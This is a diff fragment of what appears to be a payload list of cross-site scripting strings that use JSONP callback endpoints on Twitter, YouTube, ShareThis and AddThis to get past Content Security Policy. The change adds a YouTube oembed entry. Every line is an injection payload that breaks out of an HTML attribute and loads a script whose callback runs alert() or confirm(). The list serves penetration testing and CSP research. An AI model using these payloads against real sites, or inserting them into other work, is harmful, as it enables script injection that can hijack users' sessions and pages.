@@ -44,6 +44,8 @@
 "><script+src="http://search.twitter.com/trends.json?callback=alert()"></script>
 "><script+src="https://twitter.com/statuses/user_timeline/yakumo119info.json?callback=confirm()"></script>
 "><script+src="https://twitter.com/status/user_timeline/kbeautysalon.json?count=1&callback=confirm()"></script>
+#Youtbe
+<script/src=https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=Z_Kk1zf1614&callback=confirm()></script>
 #Others:
 "><script+src="https://www.sharethis.com/get-publisher-info.php?callback=alert(1337)"></script>
 "><script+src="https://m.addthis.com/live/red_lojson/100eng.json?callback=alert(1337)"></script>
